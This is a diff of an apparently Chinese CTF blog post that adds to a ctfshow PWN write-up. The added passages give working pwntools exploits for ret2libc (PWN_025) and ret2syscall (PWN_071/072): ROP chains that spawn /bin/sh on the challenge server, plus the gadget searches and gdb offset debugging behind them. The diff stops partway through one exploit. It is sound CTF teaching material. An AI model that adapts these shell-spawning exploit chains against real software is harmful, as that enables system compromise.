@@ -10,7 +10,7 @@
 <meta property='og:description' content="二进制漏洞与利用，PWN入门_wrtieup，会员套餐360题">
 <meta property='og:url' content='https://expl0rer.top/p/ctfshow-pwn-writeup/'>
 <meta property='og:site_name' content='Expl0rer.Ct'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-08-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-09-26T02:19:28&#43;08:00'/><meta property='og:image' content='https://expl0rer.top/p/ctfshow-pwn-writeup/ctfshow.png' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-08-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-09-30T00:30:40&#43;08:00'/><meta property='og:image' content='https://expl0rer.top/p/ctfshow-pwn-writeup/ctfshow.png' />
 <meta name="twitter:title" content="ctfshow-pwn-writeup">
 <meta name="twitter:description" content="二进制漏洞与利用，PWN入门_wrtieup，会员套餐360题"><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://expl0rer.top/p/ctfshow-pwn-writeup/ctfshow.png' />
@@ -761,7 +761,7 @@ unicode: "ece7"
             <li><a href="#逐行解析手敲shellcode">逐行解析手敲shellcode</a></li>
           </ol>
         </li>
-        <li><a href="#pwn_025待定">PWN_025（待定）</a>
+        <li><a href="#pwn_025">PWN_025</a>
           <ol>
             <li><a href="#ret2libc攻击">ret2libc攻击</a></li>
             <li><a href="#ret2libc实现步骤">ret2libc实现步骤</a></li>
@@ -2922,7 +2922,7 @@ unicode: "ece7"
 	
 ></p>
 <p>大致思路知道就好，靶机的flag是动态变化的。</p>
-<h3 id="pwn_025待定">PWN_025（待定）
+<h3 id="pwn_025">PWN_025
 </h3><p>题目：开启NX保护，或许可以试试ret2libc</p>
 <p><a class="link" href="PWN_025" >PWN_025</a></p>
 <p>根据题目，也就是说具体攻击手法为：<code>ret2libc</code></p>
@@ -3188,28 +3188,24 @@ unicode: "ece7"
 </span><span class="lnt">16
 </span><span class="lnt">17
 </span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
-</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28298</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28157</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
 </span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">write</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">write</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">,</span><span class="n">write</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">write</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table>
@@ -8344,6 +8340,7 @@ unicode: "ece7"
 </div><p>建议大家在以后要多学学汇编语言，有时候手敲是真的实用，好理解。</p>
 <h3 id="ret2syscall"><strong>ret2syscall</strong>
 </h3><p>ret2syscall的核心思想是通过控制程序的执行流程，使程序执行系统调用（syscall）指令来获取系统资源或执行特定操作。系统调用是操作系统提供给用户程序的接口，用于请求内核服务。例如，在Linux系统中，execve系统调用可以用来启动一个新的程序（如/bin/sh），从而获取shell。</p>
+<p>ret2syscall 是通过 <strong>拼接程序中的 gadget（指令片段）</strong>，手动设置系统调用所需的寄存器值，最终触发 <code>int 0x80</code>（32 位 Linux 系统调用入口）来执行命令的攻击方法。</p>
 <blockquote class="alert alert-note">
     <blockquote>
 <p>1.在32位Linux系统中，系统调用通过int 0x80指令触发，需要设置以下寄存器：</p>
@@ -8402,8 +8399,395 @@ unicode: "ece7"
 	
 ></p>
 <p>有明显栈溢出漏洞、<code>gets函数</code>；题目描述以及各处都提示了让用ret2syscall来进行攻击，我们可以利用程序中的 gadgets 来获得shell，而对应的 shell 获取则是利用系统调用。</p>
+<p>大致思路是先栈溢出填充缓冲区，利用gadgets调用syscall，也就是传递它的调用号<code>0xb</code>，用rax寄存器传递，然后调用execve函数：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">execve<span class="o">(</span><span class="s2">&#34;/bin/sh&#34;</span>,NULL,NULL<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>需要用到eax系统调用参数传递的寄存器的gadget：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary pwn --only <span class="s2">&#34;pop|ret&#34;</span><span class="p">|</span>grep eax
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ctfshow-pwn-writeup/263.png"
+	width="1255"
+	height="171"
+	srcset="/p/ctfshow-pwn-writeup/263_hu_326ee45a78f9d319.png 480w, /p/ctfshow-pwn-writeup/263_hu_d53916b8141aa5b2.png 1024w"
+	loading="lazy"
+	
+		alt="pop_eax_ret:0x080bb196"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="733"
+		data-flex-basis="1761px"
+	
+></p>
+<p>execve函数有三个参数，32位架构靠栈传递参数，所以要有参数寄存器：<code>ebx</code>（第 1 参）、<code>ecx</code>（第 2 参）、<code>edx</code>（第 3 参），也就是：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary pwn --only <span class="s2">&#34;pop|ret&#34;</span><span class="p">|</span>grep ebx
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>同理，int 0x80调用号的gadget地址亦是如此：</p>
+<p><img src="/p/ctfshow-pwn-writeup/269.png"
+	width="1381"
+	height="351"
+	srcset="/p/ctfshow-pwn-writeup/269_hu_24a61b0f2e8ca09a.png 480w, /p/ctfshow-pwn-writeup/269_hu_e8d841aa604d322b.png 1024w"
+	loading="lazy"
+	
+		alt="int_0x80:0x08049421"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="393"
+		data-flex-basis="944px"
+	
+></p>
+<p><img src="/p/ctfshow-pwn-writeup/264.png"
+	width="1219"
+	height="236"
+	srcset="/p/ctfshow-pwn-writeup/264_hu_d49a61625bac63d0.png 480w, /p/ctfshow-pwn-writeup/264_hu_b65b203022f2e0fd.png 1024w"
+	loading="lazy"
+	
+		alt="pop_edx_ecx_ebx_ret:0x0806eb90"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="516"
+		data-flex-basis="1239px"
+	
+></p>
+<p>/bin/sh的地址：</p>
+<p><img src="/p/ctfshow-pwn-writeup/265.png"
+	width="1333"
+	height="465"
+	srcset="/p/ctfshow-pwn-writeup/265_hu_4cef6958caeafb9c.png 480w, /p/ctfshow-pwn-writeup/265_hu_d16ab7ba28a6252d.png 1024w"
+	loading="lazy"
+	
+		alt="binsh:0x80BE408"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="286"
+		data-flex-basis="688px"
+	
+></p>
+<p>同理int 0x80</p>
+<p>我以为的exp&hellip;&hellip;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28266</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_eax_ret</span> <span class="o">=</span> <span class="mh">0x080bb196</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_edx_ecx_ebx_ret</span> <span class="o">=</span> <span class="mh">0x0806eb90</span>
+</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="mh">0x80BE408</span>
+</span></span><span class="line"><span class="cl"><span class="n">int_0x80</span> <span class="o">=</span> <span class="mh">0x08049421</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x64</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xb</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">int_0x80</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>试半天爆EOF，也是无语，后来才知道想起这个程序是静态编译的，而运行程序是动态的，在IDA上呈现的数据可能是有偏差，这让我想起了缓冲区大小，寄存器esp是动态寄存器，<strong>ebp-64h</strong>可能是错误的，于是我开始用动态调试<code>pwngdb</code>，既然gets是我们唯一能和程序交互的地方，我们可以通过gets函数，输入一些垃圾值，那就aaaa吧，刚好4字节（建议不要太大，万一溢出了程序就崩溃了，当然aaa、ctf也行），让esp把我所输入的值运走，这会就能看到esp的地址了，然后用ebp地址和它相减得到偏移量了。</p>
+<p><img src="/p/ctfshow-pwn-writeup/266.png"
+	width="1836"
+	height="838"
+	srcset="/p/ctfshow-pwn-writeup/266_hu_a77d25f28c503b3f.png 480w, /p/ctfshow-pwn-writeup/266_hu_97886add58639320.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="219"
+		data-flex-basis="525px"
+	
+></p>
+<p>在右边的运行框上，先给程序进行break main指令给main函数断点进行动态调试准备，然后开始了，用<code>n</code>指令（也就是next缩写，一步步进行，左边的调试框也会看到变化），接着回车换行一直进行下一步操作，直到看到有熟悉的ctfshow交互界面和让你输入的交互操作时就可以了：</p>
+<p><img src="/p/ctfshow-pwn-writeup/267.png"
+	width="1830"
+	height="733"
+	srcset="/p/ctfshow-pwn-writeup/267_hu_53af3ccc1bf52b4e.png 480w, /p/ctfshow-pwn-writeup/267_hu_f8f1b70314387566.png 1024w"
+	loading="lazy"
+	
+		alt="esp地址：0xffffceec"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="249"
+		data-flex-basis="599px"
+	
+></p>
+<p>这时输入AAAA，左边跟着变化，esp地址出现了。</p>
+<p>查询栈帧底部ebp寄存器地址：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">info registers
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ctfshow-pwn-writeup/268.png"
+	width="810"
+	height="718"
+	srcset="/p/ctfshow-pwn-writeup/268_hu_cdb1a5a742eaf8ff.png 480w, /p/ctfshow-pwn-writeup/268_hu_7b1f43937804a501.png 1024w"
+	loading="lazy"
+	
+		alt="ebp:0xffffcf58"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="112"
+		data-flex-basis="270px"
+	
+></p>
+<p>ebp - esp =&gt; 0xffffcf58 - 0xffffceec =&gt; 6C = 108</p>
+<p>这是偏移量，再覆盖ebp本身，那就是112了</p>
+<p>最终exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28266</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_eax_ret</span> <span class="o">=</span> <span class="mh">0x080bb196</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_edx_ecx_ebx_ret</span> <span class="o">=</span> <span class="mh">0x0806eb90</span>
+</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="mh">0x80BE408</span>
+</span></span><span class="line"><span class="cl"><span class="n">int_0x80</span> <span class="o">=</span> <span class="mh">0x08049421</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">112</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xb</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">int_0x80</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote class="alert alert-warn">
+    <blockquote>
+<p>所以说后续看到静态编译一定要多注意偏移量，后续要熟练运用pwngdb动态调试和pwndbg。</p></blockquote></blockquote>
 <h3 id="pwn_072">PWN_072
 </h3><p>题目：接着练ret2syscall，多系统函数调用。 <a class="link" href="PWN_072" >PWN_072</a></p>
+<p>checksec一下：</p>
+<p><img src="/p/ctfshow-pwn-writeup/270.png"
+	width="785"
+	height="200"
+	srcset="/p/ctfshow-pwn-writeup/270_hu_11c7119c01019f55.png 480w, /p/ctfshow-pwn-writeup/270_hu_e602151e18533c05.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="392"
+		data-flex-basis="942px"
+	
+></p>
+<p>32位关闭栈保护与PIE。</p>
+<p>IDA分析，依旧静态编译：</p>
+<p><img src="/p/ctfshow-pwn-writeup/271.png"
+	width="714"
+	height="250"
+	srcset="/p/ctfshow-pwn-writeup/271_hu_fce3f959fda3fd0.png 480w, /p/ctfshow-pwn-writeup/271_hu_ee7f129c4ad1c729.png 1024w"
+	loading="lazy"
+	
+		alt="main函数"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="285"
+		data-flex-basis="685px"
+	
+></p>
+<p>看到gets函数，和上题差不多，都是利用栈溢出漏洞。</p>
+<p>/bin/sh在IDA上搜索不到，不能返回地址执行getshell了，那就找另外一种方法。确实难找，read衍生函数很多，找到个单纯“read”的函数是真难&hellip;&hellip;</p>
+<p><img src="/p/ctfshow-pwn-writeup/272.png"
+	width="1169"
+	height="358"
+	srcset="/p/ctfshow-pwn-writeup/272_hu_d83895fa855b5b5b.png 480w, /p/ctfshow-pwn-writeup/272_hu_adb2fe1b9c39c764.png 1024w"
+	loading="lazy"
+	
+		alt="read函数"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="326"
+		data-flex-basis="783px"
+	
+></p>
+<p>不会就丢给AI吧，这确实有点难去读懂&hellip;&hellip;</p>
+<p><strong>有read函数那我们可以用它去读取字符串到内存呐，利用read函数来进行手动写入“/bin/sh”字符串。</strong></p>
+<p>在main函数中没看到调用read函数，只能我们写exp时利用syscall去调用read函数，搭配gadgets去让read通过寄存器去读取/bin/sh字符串。可以看到read函数需要三个参数，加上自身系统调用号，我们就需要使用eax、ebx、ecx、edx的gadgets。</p>
+<p>gadget查询：</p>
+<p><img src="/p/ctfshow-pwn-writeup/273.png"
+	width="1335"
+	height="471"
+	srcset="/p/ctfshow-pwn-writeup/273_hu_f21142f753693b87.png 480w, /p/ctfshow-pwn-writeup/273_hu_4bc82d8f24bc116a.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="283"
+		data-flex-basis="680px"
+	
+></p>
+<p><img src="/p/ctfshow-pwn-writeup/274.png"
+	width="1273"
+	height="346"
+	srcset="/p/ctfshow-pwn-writeup/274_hu_20e73841a55bd7fd.png 480w, /p/ctfshow-pwn-writeup/274_hu_a5fd2ee60dfff618.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="367"
+		data-flex-basis="883px"
+	
+></p>
+<p>pop_edx_ecx_ebx_ret：0x0806ecb0</p>
+<p>pop_eax_ret：0x080bb2c6</p>
+<p>int 0x80：0x08049421</p>
+<p>调用read函数，read函数系统调用号是0x3，用eax寄存，三个参数用ebx、ecx、edx分别暂时寄存，int 0x80去开启执行read函数，把<code>/bin/sh</code>写入内存bss段后，接着执行<code>execve</code>函数，也是用一样的gadgets：</p>
+<p><img src="/p/ctfshow-pwn-writeup/275.png"
+	width="1058"
+	height="390"
+	srcset="/p/ctfshow-pwn-writeup/275_hu_de707a3a1df9d98.png 480w, /p/ctfshow-pwn-writeup/275_hu_e6147e0449921e7b.png 1024w"
+	loading="lazy"
+	
+		alt="读入字符串到bss内存段的起始地址:0x080eb000"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="271"
+		data-flex-basis="651px"
+	
+></p>
+<blockquote class="alert alert-note">
+    <blockquote>
+<p>read函数的解释：</p>
+<p><img src="/p/ctfshow-pwn-writeup/277.png"
+	width="725"
+	height="299"
+	srcset="/p/ctfshow-pwn-writeup/277_hu_5928d148ef09be4f.png 480w, /p/ctfshow-pwn-writeup/277_hu_4f0c279e6ad4b93d.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="242"
+		data-flex-basis="581px"
+	
+></p>
+<ul>
+<li><code>a1</code>：表示文件描述符（file descriptor），是一个非负整数。在 Linux 系统中，文件描述符是一个指向已打开文件的引用，常见的值有：</li>
+<li><code>0</code> 代表标准输入（<code>stdin</code>）。</li>
+<li><code>1</code> 代表标准输出（<code>stdout</code>）。</li>
+<li><code>2</code> 代表标准错误输出（<code>stderr</code>）。</li>
+<li>当打开一个普通文件或其他类型的文件时，系统会分配一个大于 2 的文件描述符。</li>
+<li><strong><code>a2</code></strong>：指向用于存储读取数据的缓冲区的地址。也就是说，从文件描述符 <code>a1</code> 所指向的文件中读取的数据，会被存储到 <code>a2</code> 所指向的内存区域中。</li>
+<li><strong><code>a3</code></strong>：表示要读取的字节数，即指定从文件描述符 <code>a1</code> 所指向的文件中读取多少个字节的数据到 <code>a2</code> 所指向的缓冲区中。</li>
+</ul>
+<p>总的来说，<code>read</code> 函数的作用就是从指定的文件描述符所对应的文件中，读取指定字节数的数据到给定的缓冲区中，并且在多线程环境下，对异步取消等情况进行了一定的处理。</p></blockquote></blockquote>
+<p>想起上一题，我怕有坑，还特定去用pwngdb调了下，发现真有猫腻：</p>
+<p><img src="/p/ctfshow-pwn-writeup/276.png"
+	width="1836"
+	height="784"
+	srcset="/p/ctfshow-pwn-writeup/276_hu_565afc3bc813c434.png 480w, /p/ctfshow-pwn-writeup/276_hu_19f03963b000ad83.png 1024w"
+	loading="lazy"
+	
+		alt="偏移量为40（十进制）"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="234"
+		data-flex-basis="562px"
+	
+></p>
+<p>这确实和IDA静态分析的偏移量大小不一样，所以下次看到静态编译的程序我直接留一手心眼用pwngdb看一眼偏移量先😄。</p>
+<p>exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
